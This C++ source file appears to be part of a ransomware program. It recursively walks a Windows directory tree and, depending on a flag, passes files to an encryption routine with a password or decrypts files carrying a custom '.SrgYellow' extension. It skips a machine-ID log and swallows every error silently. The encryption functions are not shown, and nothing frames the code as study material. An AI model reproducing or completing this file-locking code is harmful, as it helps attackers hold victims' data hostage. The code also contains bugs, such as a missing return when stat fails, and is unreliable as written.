#include "scanPC.h"

std::vector<std::string> GetFileNamesInDirectory(std::string directory)
{
	std::vector<std::string> files;
	WIN32_FIND_DATA fileData;
	HANDLE hFind;

	if (!((hFind = FindFirstFile(directory.c_str(), &fileData)) == INVALID_HANDLE_VALUE))
    {
        while(FindNextFile(hFind, &fileData))
        {
    		files.push_back(fileData.cFileName);
        }
	}

	FindClose(hFind);
	return files;
}

int controllo(std::string path)
{
    struct stat s;
    char *cpath= &path[0u];
    
    if( stat(cpath,&s) == 0 )
    {
        if( s.st_mode & S_IFDIR )
            return 0;
        else if( s.st_mode & S_IFREG )
            return 1;
        else
            return 2;
    }
}

void ricerca (std::string path, std::string psw, bool esiste)
{
    try
    {
        std::vector<std::string> vFileNames = GetFileNamesInDirectory(path + "/*");

        for (int i = 1; i < vFileNames.size(); i++)
        {
            std::string nuovoPath = path+ "/" +vFileNames[i];

            if(controllo(nuovoPath)==1 || controllo(nuovoPath)==2)
            {
                if (esiste == true)
                {
                    if (hasEnding(nuovoPath, ".SrgYellow") == true)
                        leggiDecritta(path+ "/" +vFileNames[i], psw);
                }
                else
                {
                    if (!((vFileNames[i]== "IdComputer.log")||(checkExt(vFileNames[i])==false)))
                        leggiCritta(path+ "/" +vFileNames[i], psw);
                }
            }    

            ricerca(path+ "/" +vFileNames[i], psw, esiste);                    
        }           
    } catch (...)
    {
        
    }
}